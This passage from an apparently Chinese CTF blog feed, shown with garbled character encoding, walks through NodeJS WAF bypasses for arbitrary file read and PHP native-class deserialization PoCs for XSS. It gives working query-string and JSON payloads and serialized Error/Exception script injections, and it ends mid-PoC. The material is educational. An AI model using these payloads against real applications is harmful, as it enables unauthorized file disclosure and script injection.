src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668851120660-015dd3fc-8e23-42ce-86ae-08e0a10ec78c.png" alt="image.png"><br>ä»”ç»†é˜…è¯»æºä»£ç åï¼Œæˆ‘å¾ˆç¡®å®šæˆ‘ä»¬ä¼šä½¿ç”¨ http å‚æ•°æ±¡æŸ“ï¼Œå› ä¸ºæ²¡æœ‰æ£€æŸ¥ get å‚æ•°çš„ç±»å‹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¾“å…¥ä¸€ä¸ªæ•°ç»„å¹¶å°è¯•åˆ©ç”¨å¯èƒ½å‘ç”Ÿçš„ä¸å½“è¡Œä¸ºã€‚<br>å‡è®¾æˆ‘ä»¬è¾“å…¥ä»¥ä¸‹æ•°ç»„ï¼š</p><pre><code class="javascript">[&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../proc/self/cwd/flag.txt&quot;,&quot;.&quot;,&quot;js&quot;]</code></pre><ul><li><strong>ç¬¬ä¸€æ¬¡æ£€æŸ¥</strong>ï¼šif (file.includes(â€˜ â€˜) || file.includes(â€˜/â€˜))</li></ul><p>å½“ includes åº”ç”¨äºæ•°ç»„æ—¶ï¼Œå®ƒä¼šæ£€æŸ¥æ˜¯å¦æœ‰ä¸€ä¸ªå­—æ®µç­‰äºä¼ é€’çš„å‚æ•°ï¼ˆåœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ä¸ºâ€œâ€å’Œâ€œ/â€ï¼‰ï¼Œè¿™é‡Œä¸º falseï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æˆåŠŸé€šè¿‡æ­¤æ£€æŸ¥</p><ul><li><strong>ç¬¬äºŒæ¬¡æ£€æŸ¥</strong>ï¼šif (!allowedFileType(file))</li></ul><p>æˆ‘ä»¬æ¥çœ‹çœ‹è¿™ä¸ªå‡½æ•°çš„ä»£ç ï¼š</p><pre><code class="javascript">function allowedFileType(file) &#123;const format = file.slice(file.indexOf(&#39;.&#39;) + 1);    if (format == &#39;js&#39; || format == &#39;ts&#39; || format == &#39;c&#39; || format == &#39;cpp&#39;) &#123;        return true;    &#125;    return false;&#125;</code></pre><p>å®ƒå°†ä» indexOf(â€œ.â€)+1 å¼€å§‹å¯¹æˆ‘ä»¬çš„æ•°ç»„è¿›è¡Œåˆ‡ç‰‡ï¼Œæ‰€ä»¥åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œç»“æœå°†æ˜¯æˆ‘ä»¬æ•°ç»„çš„æœ€åä¸€ä¸ªå­—æ®µï¼Œå³â€œjsâ€ï¼Œæˆ‘ä»¬ä¹Ÿå°†é€šè¿‡æ­¤æ£€æŸ¥ï¼š<br>ä»¥ä¸‹è¡Œå°†åˆ é™¤æ•°ç»„çš„æœ€åä¸¤ä¸ªå­—æ®µï¼š</p><pre><code class="javascript">if (file.length &gt; 5) &#123;  file = file.slice(0, 5);&#125;# &quot;Welcome to GeeksforGeeks&quot;.slice(0, 5)  ---&gt; Welcom</code></pre><p>æ‰€ä»¥æˆ‘ä»¬çš„æ•°ç»„å°†å˜æˆï¼š</p><pre><code class="javascript">[&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../&quot;,&quot;../../proc/self/cwd/flag.txt&quot;]</code></pre><p>æœ€ååœ¨è§£æè·¯å¾„å returnedFile å°†åŒ…å« /proc/self/cwd/flag.txt</p><pre><code class="javascript">const returnedFile = path.resolve(__dirname + &#39;/&#39; + file);</code></pre><p><strong>æ³¨æ„ï¼š</strong>ç”±äºæˆ‘ä»¬çš„â€œ../../â€å­—æ®µï¼Œå½“å‰ç›®å½•çš„__dirname è¢«å¿½ç•¥ï¼Œè€Œ**/proc/self/cwd**ç­‰åŒäºå½“å‰ç›®å½•ã€‚<br>æ‰€ä»¥æœ€åæˆ‘ä»¬çš„æ•°ç»„å°†è¢«è§£æä¸ºæˆ‘ä»¬æƒ³è¦çš„è·¯å¾„ï¼Œè¿™æ˜¯æœ€ç»ˆçš„æœ‰æ•ˆè½½è·ï¼Œå®ƒåªæ˜¯å¯¹æˆ‘ä»¬ä¹‹å‰æ‰€è¯´çš„çš„ä¸€ç§è§£é‡Šï¼š</p><pre><code class="javascript">http://chall.csivit.com:30222/getfile?file[]=../../&amp;file[]=../../&amp;file[]=../../&amp;file[]=../../&amp;file[]=../../proc/self/cwd/flag.txt&amp;file[]=.&amp;file[]=js</code></pre><h2 id="corCTF2022-a-simple-waf"><a href="#corCTF2022-a-simple-waf" class="headerlink" title="corCTF2022 a simple waf"></a>corCTF2022 a simple waf</h2><p><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935506091-1813cc21-6778-4925-9957-d8eec87bba05.png"><br>æŒ‘æˆ˜ä¸ºæˆ‘ä»¬æä¾›äº†<a href="https://github.com/thangpd3160/CTF-Writeup/tree/main/corCTF/2022/simplewaf">æºä»£ç </a>å’Œä¸€ä¸ªDockerfile. ç”±äº Instancer åªåˆ›å»ºä¸€ä¸ªæŒç»­ 3 åˆ†é’Ÿçš„æŒ‘æˆ˜å®ä¾‹ï¼Œè¿™éå¸¸ä¸æ–¹ä¾¿ï¼Œæ‰€ä»¥æˆ‘ä½¿ç”¨æä¾›çš„èµ„æºåœ¨æœ¬åœ°æ„å»ºå’Œè°ƒè¯•ä»¥ç©è¿™ä¸ªæŒ‘æˆ˜ã€‚<br>æµè§ˆç½‘ç«™localhost:3456ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™åªæ˜¯ä¸€ä¸ªç®€å•çš„ç½‘é¡µå±•ç¤ºæŒ‡å®šæ–‡ä»¶çš„å†…å®¹ã€‚<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935640897-81cac506-2e2f-4d19-ac63-515f73604c5d.png" alt="image.png"><br>è¿™ä¸ªæŒ‘æˆ˜çš„ç›®æ ‡æ˜¯è¯»å–flag.txtæ–‡ä»¶çš„å†…å®¹â€¦â€¦ä½†ä»¥æŸç§æ–¹å¼ç»•è¿‡includes(â€˜flagâ€™)wafçš„æ£€æŸ¥ã€‚æ‰€æœ‰çš„æŒ‘æˆ˜ä»£ç éƒ½å¯ä»¥åœ¨ çœ‹åˆ°main.js</p><pre><code class="javascript">const express = require(&quot;express&quot;);const fs = require(&quot;fs&quot;);const app = express();const PORT = process.env.PORT || 3456;app.use((req, res, next) =&gt; &#123;    if([req.body, req.headers, req.query].some(        (item) =&gt; item &amp;&amp; JSON.stringify(item).includes(&quot;flag&quot;)    )) &#123;        return res.send(&quot;bad hacker!&quot;);    &#125;    next();&#125;);app.get(&quot;/&quot;, (req, res) =&gt; &#123;    try &#123;        res.setHeader(&quot;Content-Type&quot;, &quot;text/html&quot;);        res.send(fs.readFileSync(req.query.file || &quot;index.html&quot;).toString());           &#125;    catch(err) &#123;        console.log(err);        res.status(500).send(&quot;Internal server error&quot;);    &#125;&#125;);app.listen(PORT, () =&gt; console.log(`web/simplewaf listening on port $&#123;PORT&#125;`));</code></pre><p><strong>åˆ†æ</strong><br>é˜…è¯»æºä»£ç åï¼Œæˆ‘æƒ³åˆ°äº†ä¸¤ä¸ªé—®é¢˜ã€‚</p><ol><li>å¦‚ä½•ç»•è¿‡includesæ¡ä»¶ï¼Ÿï¼ˆç»å¯¹â€¦â€¦æˆ‘ä»¬æ­£åœ¨å¯»æ‰¾çš„ä¸œè¥¿ï¼‰ï¼Œä»¥åŠ</li><li>readFileSyncè¯¥å‡½æ•°å¯ä»¥é‡‡ç”¨ä»€ä¹ˆç±»å‹çš„å‚æ•°æ¥è¯»å–æ–‡ä»¶ï¼Ÿ</li></ol><p>é€šè¿‡åœ¨ Google ä¸Šæœç´¢ï¼Œæˆ‘å‘ç°äº†ä¸€ç¯‡å…³äº<a href="https://ahmed-belkahla.me/post/csictf2020/">NodeJS Bypass Filter CTF</a>çš„æ–‡ç« ï¼Œå®ƒåœ¨æŸäº›æ—¶å€™ç±»ä¼¼äºè¿™ä¸ªæŒ‘æˆ˜ï¼š</p><ul><li>è¿™ä¸¤ä¸ªæŒ‘æˆ˜éƒ½æ²¡æœ‰éªŒè¯è¾“å…¥çš„ç±»å‹ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥å°†è¾“å…¥ä½œä¸ºæ•°ç»„è€Œä¸æ˜¯å­—ç¬¦ä¸²ä¼ é€’ï¼Œå¹¶ä¸”</li><li>è¿™ä¸¤ä¸ªæŒ‘æˆ˜éƒ½éœ€è¦ç»•è¿‡includeså‡½æ•°æ‰èƒ½åˆ°è¾¾æ ‡å¿—ï¼</li></ul><p>å¤ªæ£’äº†ï¼è®¤ä¸ºæˆ‘æ‰¾åˆ°äº†æ­£ç¡®çš„ä½ç½®ï¼Œæˆ‘å°è¯•äº† payload file[]=x&amp;file[]=flag.txtã€‚ä¸å¹¸çš„æ˜¯ï¼Œå®ƒæ— æ³•ç»•è¿‡è¿™ä¸ªæŒ‘æˆ˜çš„waf<br><img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935762043-fff8116b-850a-4c5a-bdcd-db5e94a0d1a8.png" alt="image.png"><br>ä¸ºä»€ä¹ˆå®ƒä¸èƒ½ç»•è¿‡wafï¼Ÿå¥½å§ï¼Œæˆ‘å‘ç°è¿™è¡Œä»£ç çš„æŒ‘æˆ˜ä¹‹é—´æœ‰ä¸€ä¸ªå…³é”®çš„ä¸åŒç‚¹<br>(item) =&gt; item &amp;&amp; JSON.stringify(item).includes(â€œflagâ€)<br>simplewafä¸é‡‡ç”¨åŸå§‹è¾“å…¥æ¥æ‰§è¡Œè¾“å…¥éªŒè¯ï¼Œè€Œæ˜¯é¢„å…ˆå°†åŸå§‹è¾“å…¥è½¬æ¢ä¸º JSON å­—ç¬¦ä¸²<strong>ã€‚</strong>å› æ­¤ï¼Œè¯¥includeså‡½æ•°ä»ç„¶å¯ä»¥æ£€æŸ¥è½¬æ¢åçš„å­—ç¬¦ä¸²æ˜¯å¦åŒ…å«flagã€‚<br>è‡³æ­¤ï¼Œæˆ‘æ— è®ºå¦‚ä½•ä¹Ÿæƒ³ä¸å‡ºç»•è¿‡è¿™ä¸ªincludeså‡½æ•°â€¦â€¦æ‰€ä»¥ï¼Œæˆ‘è½¬åˆ°ç¬¬äºŒä¸ªé—®é¢˜ï¼Œçœ‹çœ‹é‚£ä¸ªå‡½æ•°çš„NodeJSæ–‡æ¡£ã€‚<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935789510-8354252a-f6cc-463c-b632-bb7e60a1a1de.png" alt="image.png"><br>å¥½çš„ï¼Œæ‰€ä»¥è·¯å¾„å‚æ•°å¯ä»¥æ˜¯ä¸€ä¸ª<string> | <Buffer> | <URL> | <integer>. ä½†æ˜¯ï¼Œè¯·æ±‚æŸ¥è¯¢å€¼çš„ç±»å‹å§‹ç»ˆæ˜¯å­—ç¬¦ä¸²ã€‚æˆ‘ä»¬å¦‚ä½•ä¼ å…¥readFileSyncå‡½æ•° aURLæˆ– anintegeræˆ– a ä»¥å¤–çš„ä»»ä½•å…¶ä»–å†…å®¹stringï¼Ÿ<br>èµ·åˆæƒ³åˆ°ï¼Œæˆ‘å°è¯•å°†å­—ç¬¦ä¸²æ ¼å¼åŒ–ä¸ºURL: <a href="http://localhost:3456/wow.html%E3%80%82%E5%80%92%E9%9C%89%EF%BC%8C%E4%B8%8D%E8%A1%8C~![image.png](NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935789961-8d941817-7645-436a-a08b-a27bfb04d986.png)">http://localhost:3456/wow.htmlã€‚å€’éœ‰ï¼Œä¸è¡Œ~![image.png](NodeJsæ¼æ´æ€»ç»“/1668935789961-8d941817-7645-436a-a08b-a27bfb04d986.png)</a><br>åœæ­¢å¾’åŠ³çš„çŒœæµ‹ï¼Œæˆ‘å†³å®šåœ¨<a href="https://github.com/nodejs/node/blob/main/lib/fs.js#L464">github</a>readFileSyncä¸Šçš„ NodeJS æºä»£ç ä¸­ä»”ç»†æŸ¥çœ‹è¯¥åŠŸèƒ½ã€‚<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935789036-6b7a5233-e982-4190-aaae-0a8ffc5c9972.png" alt="image.png"><br>ç¬¬ 469 è¡ŒåŠä»¥ä¸‹çš„ä»£ç ç‰‡æ®µæ‰§è¡Œè¯»å–æ–‡ä»¶è¿‡ç¨‹ï¼Œæ— éœ€æ·±å…¥ç ”ç©¶ã€‚æˆ‘ä»¬éœ€è¦æ·±å…¥ç ”ç©¶çš„è¦ç‚¹æ˜¯ç¬¬ 467 è¡Œçš„ä»£ç ã€‚é€šè¿‡ç ”ç©¶fs.openSyncå‡½æ•°æ¥è·Ÿè¸ªä»£ç ã€‚<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935788506-b6f91f83-3bd6-43ed-ab40-d21fb43b860d.png" alt="image.png"><br>é€šè¿‡è°ƒæŸ¥getValidatedPathåŠŸèƒ½ç»§ç»­å…³æ³¨ã€‚<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935788081-009143b9-094b-470d-b9c8-36f6f3ec9a1c.png" alt="image.png"><br>æŒ‰ä½ä¸æ”¾ï¼Œè¿™é‡Œä¼šå‡ºç°ä¸€äº›æœ‰è¶£çš„ä¸œè¥¿ã€‚å› æ­¤ï¼Œå¦‚æœè¯¥fileURLOrPathå€¼ä¸ä¸º nullï¼Œå¹¶ä¸”å…¶ä¸­æœ‰ existshrefå’Œoriginï¼Œå®ƒå°†è°ƒç”¨ to fileURLToPathï¼Œå°†fileURLOrPathå€¼è½¬æ¢ä¸º URLã€‚è¿™å°±æ˜¯æˆ‘æƒ³è¯´çš„ï¼æˆ‘èƒ½æ„Ÿè§‰åˆ°æˆ‘èµ°çš„è·¯æ˜¯å¯¹çš„ï¼<br>è·å¾—åŠ¨åŠ›ï¼Œæˆ‘ç»§ç»­ç ”ç©¶è¿™ä¸ªfileURLToPathåŠŸèƒ½ã€‚<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935794727-c8ad1160-3801-48c0-b0d0-625d21dc379a.png" alt="image.png"><br>è¯¥å€¼çš„ä¸€ä¸ªé™„åŠ æ¡ä»¶fileURLOrPathæ˜¯å…¶åè®®å¿…é¡»æ˜¯file:. å…¨éƒ¨æ£€æŸ¥é€šè¿‡åï¼Œä¼šè°ƒç”¨ç›¸åº”çš„å‡½æ•°ä»URLä¸­è·å–è·¯å¾„ã€‚ç”±äºæˆ‘åœ¨ Linux ä¸Šè°ƒè¯•ï¼Œæ‰€ä»¥æˆ‘ç»§ç»­ç ”ç©¶è¯¥getPathFromURLPosixåŠŸèƒ½ã€‚<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935795561-c49c1cd2-acc0-46b6-85c4-db4ded4c9806.png" alt="image.png"><br>å†æ¬¡æ£€æŸ¥æ­¤ä»£ç ç‰‡æ®µï¼šhostnameå¿…é¡»ä¸ºç©ºã€‚ä½†æ˜¯ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ä¸€ä»¶å€¼å¾—æ³¨æ„çš„äº‹æƒ…ï¼Œå®ƒå°†å¸®åŠ©æˆ‘ä»¬ç»•è¿‡ simplewaf çš„includesæ£€æŸ¥ï¼Œé‚£å°±æ˜¯å®ƒå°†å¯¹<strong>simplewaf</strong>pathnameæ‰§è¡Œ URL è§£ç ä»¥è·å– URLã€‚è¿™æ„å‘³ç€å¦‚æœæˆ‘ä»¬pathnameä» Web åº”ç”¨ç¨‹åºä¼ é€’ä¸€ä¸ªåŒ URL ç¼–ç å€¼ï¼Œå®ƒæœ€ç»ˆå°†æ–‡ä»¶è·¯å¾„å˜æˆçº¯æ–‡æœ¬ã€‚ä½ çŒœæ€ä¹ˆç€ï¼Ÿç”±äºå®¢æˆ·ç«¯ä¼ é€’ç»™includesæ£€æŸ¥çš„å€¼åªæ˜¯ URL è§£ç ä¸€æ¬¡ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è½»æ¾ç»•è¿‡æ­¤æ£€æŸ¥ã€‚<br>å¥½çš„ï¼Œè®©æˆ‘ä»¬æ€»ç»“ä¸€ä¸‹å°†æœ‰æ•ˆå‚æ•°fileä½œä¸º URLä¼ é€’ç»™å‡½æ•°readFileSyncéœ€è¦åšçš„æ‰€æœ‰äº‹æƒ…ã€‚</integer></URL></Buffer></string></p><ul><li>fileä¸ä¸ºç©º</li><li>file.originå­˜åœ¨</li><li>file.hrefå­˜åœ¨</li><li>file.protocol = â€˜file:â€™</li><li>file.hostname = â€˜â€™</li></ul><p>ç»•è¿‡wafå¹¶è·å¾—æ ‡å¿—çš„æœ€ç»ˆè¦æ±‚æ˜¯ï¼š</p><ul><li>file.pathnameæ˜¯åŒé‡ URL ç¼–ç </li></ul><p><strong>è§£å†³æ–¹æ¡ˆ</strong><br>æ ¹æ®ä¸Šé¢çš„åˆ†æï¼Œæˆ‘æ„é€ äº†å¦‚ä¸‹çš„payloadï¼š<br>file[origin]=x&amp;file[href]=x&amp;file[protocol]=file:&amp;file[hostname]=&amp;file[pathname]=fla%2567.txt<br>æˆ‘åªæ˜¯å¯¹å­—ç¬¦è¿›è¡ŒåŒé‡ URL ç¼–ç gä»¥ç»•è¿‡ wafã€‚ä½¿ç”¨æœ‰æ•ˆè½½è·ï¼Œæˆ‘ä»¬æˆåŠŸè·å¾—äº†æµ‹è¯•æ ‡å¿—ã€‚<img src="/2022/11/20/NodeJs%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/1668935796021-c337cfb2-2659-429c-aa5d-94fee9e55d4d.png" alt="image.png"><br>å¥½å§ï¼Œå…ˆæ‹¿çœŸæ——å§~<br>corctf{hmm_th4t_waf_w4snt_s0_s1mple}</p><h2 id="ç¥¥äº‘æ¯2022-RUSTwaf"><a href="#ç¥¥äº‘æ¯2022-RUSTwaf" class="headerlink" title="ç¥¥äº‘æ¯2022 RUSTwaf"></a>ç¥¥äº‘æ¯2022 RUSTwaf</h2><pre><code class="javascript">const express = require(&#39;express&#39;);const app = express();const bodyParser = require(&quot;body-parser&quot;)const fs = require(&quot;fs&quot;)app.use(bodyParser.text(&#123;type: &#39;*/*&#39;&#125;));const &#123;  execFileSync &#125; = require(&#39;child_process&#39;);app.post(&#39;/readfile&#39;, function (req, res) &#123;    let body = req.body.toString();    let file_to_read = &quot;app.js&quot;;    const file = execFileSync(&#39;/app/rust-waf&#39;, [body], &#123;        encoding: &#39;utf-8&#39;    &#125;).trim();    try &#123;        file_to_read = JSON.parse(file)    &#125; catch (e)&#123;        file_to_read = file    &#125;    let data = fs.readFileSync(file_to_read);    res.send(data.toString());&#125;);app.get(&#39;/&#39;, function (req, res) &#123;    res.send(&#39;see `/src`&#39;);&#125;);app.get(&#39;/src&#39;, function (req, res) &#123;    var data = fs.readFileSync(&#39;app.js&#39;);    res.send(data.toString());&#125;);app.listen(3000, function () &#123;    console.log(&#39;start listening on port 3000&#39;);&#125;);</code></pre><p>ç›´æ¥/readfileè¯»æºç </p><pre><code class="javascript">use std::env;use serde::&#123;Deserialize, Serialize&#125;;use serde_json::Value;static BLACK_PROPERTY: &amp;str = &quot;protocol&quot;;#[derive(Debug, Serialize, Deserialize)]struct File&#123;    #[serde(default = &quot;default_protocol&quot;)]    pub protocol: String,    pub href: String,    pub origin: String,    pub pathname: String,    pub hostname:String&#125;pub fn default_protocol() -&gt; String &#123;    &quot;http&quot;.to_string()&#125;//protocol is default value,can&#39;t be customizedpub fn waf(body: &amp;str) -&gt; String &#123;    if body.to_lowercase().contains(&quot;flag&quot;) ||  body.to_lowercase().contains(&quot;proc&quot;)&#123;        return String::from(&quot;./main.rs&quot;); //è¿™é‡Œé™åˆ¶æˆ‘ä»¬ä¸èƒ½å¸¦æœ‰flagå’Œprocå­—æ®µ    &#125;    if let Ok(json_body) = serde_json::from_str::&lt;Value&gt;(body) &#123;        if let Some(json_body_obj) = json_body.as_object() &#123;            if json_body_obj.keys().any(|key| key == BLACK_PROPERTY) &#123;                return String::from(&quot;./main.rs&quot;);    //è¿™é‡Œé™åˆ¶æˆ‘ä»¬çš„jsonå­—æ®µä¸èƒ½å¸¦æœ‰protocolå­—æ®µï¼Œä½†æ˜¯ä¸‹é¢é™åˆ¶æˆ‘ä»¬æ˜¯fileç»“æ„ä½“ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬ä¸€å®šè¦æœ‰protocolå­—æ®µ            &#125;        &#125;        //not contains protocol,check if struct is File        if let Ok(file) = serde_json::from_str::&lt;File&gt;(body) &#123;//é™åˆ¶æˆ‘ä»¬åªèƒ½æ˜¯è¿™ä¸ªç»“æ„ä½“            return serde_json::to_string(&amp;file).unwrap_or(String::from(&quot;./main.rs&quot;));        &#125;    &#125; else&#123;        //body not json        return String::from(body);    &#125;    return String::from(&quot;./main.rs&quot;);&#125;fn main() &#123;    let args: Vec&lt;String&gt; = env::args().collect();    println!(&quot;&#123;&#125;&quot;, waf(&amp;args[1]));  //è¿™é‡ŒæŠŠjsonçš„ç¬¬äºŒå­—æ®µä¼ è¿›å»&#125;</code></pre><p>å°†payloadä»¥jsonæ ¼å¼ä¼ ï¼Œä½†æ˜¯è¿™é‡Œç”¨åˆ°çš„payloadä¸­å­˜åœ¨protocolå¯¼è‡´rustèƒ½æ£€æµ‹åˆ°ï¼Œè¦åˆ©ç”¨unicode ç»•è¿‡<br>æœ€ç»ˆpayloadï¼š</p><pre><code class="javascript">&#123;&quot;hostname&quot;:&quot;&quot;,&quot;pathname&quot;:&quot;/fl%61g&quot;,&quot;protocol&quot;:&quot;file:&quot;,&quot;origin&quot;:&quot;fuckyou&quot;,&quot;pr\ud800otocol&quot;:&quot;file:&quot;,&quot;href&quot;:&quot;fuckyou&quot;&#125;</code></pre><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p><a href="https://blog.csdn.net/shawdow_bug/article/details/120072209">https://blog.csdn.net/shawdow_bug/article/details/120072209</a><br><a href="https://xz.aliyun.com/t/11791#toc-8">https://xz.aliyun.com/t/11791#toc-8</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> å¸¸è§æ¼æ´å’Œæ‰‹æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> node_js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpåŸç”Ÿç±»å­¦ä¹ </title>
      <link href="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="æŸ¥çœ‹å„æ–¹æ³•å†…ç½®ç±»"><a href="#æŸ¥çœ‹å„æ–¹æ³•å†…ç½®ç±»" class="headerlink" title="æŸ¥çœ‹å„æ–¹æ³•å†…ç½®ç±»"></a>æŸ¥çœ‹å„æ–¹æ³•å†…ç½®ç±»</h1><p> é€šè¿‡è¿™æ®µä»£ç æŸ¥çœ‹æ–¹æ³•çš„ç±»ï¼Œè¿™é‡Œçœ‹åˆ°__toStringæ–¹æ³•å¯¹åº”çš„Errorç±»  </p><pre><code class="php">&lt;?php$classes = get_declared_classes();foreach ($classes as $class) &#123;    $methods = get_class_methods($class);    foreach ($methods as $method) &#123;        if (in_array($method, array(            &#39;__destruct&#39;,            &#39;__toString&#39;,            &#39;__wakeup&#39;,            &#39;__call&#39;,            &#39;__callStatic&#39;,            &#39;__get&#39;,            &#39;__set&#39;,            &#39;__isset&#39;,            &#39;__unset&#39;,            &#39;__invoke&#39;,            &#39;__set_state&#39;    // å¯ä»¥æ ¹æ®é¢˜ç›®ç¯å¢ƒå°†æŒ‡å®šçš„æ–¹æ³•æ·»åŠ è¿›æ¥, æ¥éå†å­˜åœ¨æŒ‡å®šæ–¹æ³•çš„åŸç”Ÿç±»        ))) &#123;            print $class . &#39;::&#39; . $method . &quot;\n&quot;;        &#125;    &#125;&#125;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664897701461-e3b768b2-f079-4361-acd3-5955b55ff9e8.png" alt="image.png"></p><h1 id="åˆ©ç”¨Error-Exceptionå†…ç½®ç±»è¿›è¡ŒXSS"><a href="#åˆ©ç”¨Error-Exceptionå†…ç½®ç±»è¿›è¡ŒXSS" class="headerlink" title="åˆ©ç”¨Error/Exceptionå†…ç½®ç±»è¿›è¡ŒXSS"></a>åˆ©ç”¨Error/Exceptionå†…ç½®ç±»è¿›è¡ŒXSS</h1><h2 id="Errorç±»"><a href="#Errorç±»" class="headerlink" title="Errorç±»"></a>Errorç±»</h2><p>åˆ©ç”¨æ¡ä»¶:<br>php7ä»¥ä¸Š<br>å¼€å¯æŠ¥é”™æƒ…å†µä¸‹<br> Errorç±»æ˜¯phpçš„ä¸€ä¸ªå¸¸è§ç±»ï¼Œç”¨äºè‡ªå®šä¹‰ä¸€ä¸ªErrorï¼Œå½“ç”¨æˆ·è¾“å…¥é”™è¯¯çš„å€¼ï¼Œå›æ˜¾Erroré¡µé¢ï¼Œphp7ç‰ˆæœ¬ä¼šå­˜åœ¨ç±»ä¼¼çš„XSSæ¼æ´ã€‚Error::__toStringï¼ŒErrorç±»å­˜åœ¨__toStringçš„æ–¹æ³•ï¼Œè¯¥æ–¹æ³•è¿›è¡Œç±»å½“ä½œå­—ç¬¦ä¸²è¿›è¡Œå›åº”ï¼Œä¹Ÿå°±æ˜¯echo $l3ifeä¼šæ˜¾ç¤ºä»€ä¹ˆã€‚phpå¯¹è±¡å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è¾“å‡ºï¼ˆecho $l3ifeï¼‰ä¼šè§¦å‘to_Stringæ–¹æ³•ã€‚ä¸€èˆ¬ç”¨äºååºåˆ—åŒ–æ¼æ´å’ŒXSSæ¼æ´ã€‚<br> æœ¬åœ°åˆ›å»ºerror.php(phpç‰ˆæœ¬è®¾ç½®ä¸º7.0)  </p><pre><code class="php">&lt;?phphighlight_file(&#39;2.php&#39;);$a = unserialize($_GET[&#39;cmd&#39;]);echo $a;?&gt; </code></pre><p> è¿™æ®µååºåˆ—åŒ–å‡½æ•°ï¼Œå¹¶ä¸å­˜åœ¨è‡ªå®šä¹‰ç±»ï¼Œä¸å¯ä»¥æ‰“ååºåˆ—åŒ–ï¼Œå¯ä»¥ç”¨phpååºåˆ—åŒ–çš„phpå†…ç½®ç±»<br>poc:</p><pre><code class="php">&lt;?php    $a=new Error(&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;);$b = serialize($a);echo urlencode($b);  ?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664898216896-e958dd71-080f-4d98-a8be-e70d8af6f2e2-16688788988219.png" alt="image.png"></p><h2 id="Exceptionç±»"><a href="#Exceptionç±»" class="headerlink" title="Exceptionç±»"></a>Exceptionç±»</h2><p>åˆ©ç”¨æ¡ä»¶:<br>php5ã€php7<br>å¼€å¯æŠ¥é”™çš„æƒ…å†µä¸‹</p><pre><code class="php">&lt;?phpheader(&quot;Content-Type:text/html;charset=utf-8&quot;);highlight_file(__FILE__);$a = unserialize($_GET[&#39;cmd&#39;]);echo $a;?&gt;</code></pre><p>poc:</p><pre><code class="php">&lt;?php$a = new Exception(&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;);$b = serialize($a);echo urlencode($b);  ?&gt;</code></pre><p><img src="/2022/11/20/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%AD%A6%E4%B9%A0/1664898394442-c162fce3-1be4-4c2f-8ad0-7e17fc82993f.png" alt="image.png"></p><h2 id="BJDCTF-2nd-xssä¹‹å…‰"><a href="#BJDCTF-2nd-xssä¹‹å…‰" class="headerlink" title="[BJDCTF 2nd]xssä¹‹å…‰"></a><strong>[BJDCTF 2nd]xssä¹‹å…‰</strong></h2><p> é€šè¿‡gitæ‹¿åˆ°æºç   </p><pre><code class="php">&lt;?php $a = $_GET[&#39;yds_is_so_beautiful&#39;];Echo unserialize($a);</code></pre><p> ç»™äº†GETä¼ å‚ï¼Œè¿›è¡Œååºåˆ—åŒ–ï¼Œä¸çŸ¥é“æ€ä¹ˆè‡ªå®šä¹‰ç±»ï¼Œé‡åˆ°äº†ååºåˆ—åŒ–æ²¡æœ‰POPé“¾çš„æƒ…å†µã€‚åªèƒ½é€šè¿‡phpå†…ç½®ç±»è¿›è¡Œååºåˆ—åŒ–ï¼Œåˆå­˜åœ¨echoï¼Œå¯ä»¥ç”¨__toStringæ–¹æ³•è¿”å›å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–ã€‚è¯¥é¢˜ä¸ºXSSä¹‹å…‰ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡XSSæ‹¿å‡ºFLAGã€‚<br> æ€è·¯ï¼šflagä¸€èˆ¬åœ¨COOKIEçš„ä¿¡æ¯é‡Œã€‚<br>poc:</p><pre><code class="php">&lt;?php$poc=new   